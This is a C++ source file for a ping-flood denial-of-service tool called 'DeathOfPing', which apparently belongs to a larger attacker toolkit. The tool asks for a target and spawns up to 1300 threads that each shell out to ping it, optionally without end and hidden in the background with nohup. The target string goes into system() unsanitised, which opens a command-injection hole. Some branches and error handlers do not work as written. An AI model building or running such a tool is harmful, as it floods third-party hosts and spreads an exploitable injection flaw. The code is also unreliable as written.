//
// Created by ubuntu-linux on 23-11-2.
//
#include <vector>
#include "iostream"
#include "meta_attacker.hpp"
#include "thread"
#include <functional>
#include "filesystem"
#include "unistd.h"

class DeathOfPing {
private:
    std::string target;
    int number = 0;
    bool isAlways = false;
    int thread = 0;
    bool isBackup = false;
public:
    DeathOfPing() = default;

    void run_threads(int thread) {
        std::vector<std::thread> threads;
        for (int i = 0; i < thread; i++) {
            threads.emplace_back([this, i] { attack(i); });
        }
        for (auto& thread : threads) {
            thread.join();
        }
    }

    void attack(int i) {
        std::filesystem::path abs_path = std::filesystem::canonical(".");
        string s = "ping -c "+ to_string(number) + " " + target;
        if (isBackup) {
            if (isAlways) {
                s = "ping " + target;
                string s_1 =
                        "nohup " + s + " > /dev/null &";
                system(s_1.c_str());
            }else {
                string s_1 =
                        "nohup " + s + " > /dev/null &";
                system(s_1.c_str());
            }
        }else {
            if (isAlways) {
                s = "ping " + target;
                system(s.c_str());
            }
        }
    }

    void Console() {

        target = input("Input Your Attack Target: ");
        string n = input(
                "Enter the amount of data for a single user attack [If you want to Attack all the time, Enter 'max'] : "
                );
        if (n == "max") {
            isAlways = true;
        }else {
            try {
                number = stoi(n);
            }catch (const runtime_error& error) {
                std::cout << "[ERR] Your Input Error." << std::endl;
                return;
            }
        }
        try {
            thread = stoi(input("Input all the attack user number: [1-1300] "));
            if (thread > 1300 || thread < 1)
            {
                std::cerr << "Your Input Error. Break the options.";
                return;
            }
        }catch (const runtime_error& error)
        {
            std::cout << "[ERR] Your Input Error." << std::endl;
            return;
        }
        isBackup = input("Do you want run it in System background: [y or n] ") == "y";

        try {
            cout << "\n" << endl;
            run_threads(thread);
        }catch (const runtime_error& error) {
            std::cout << "[ERR] runtime Error." << std::endl;
            return;
        }
    }
};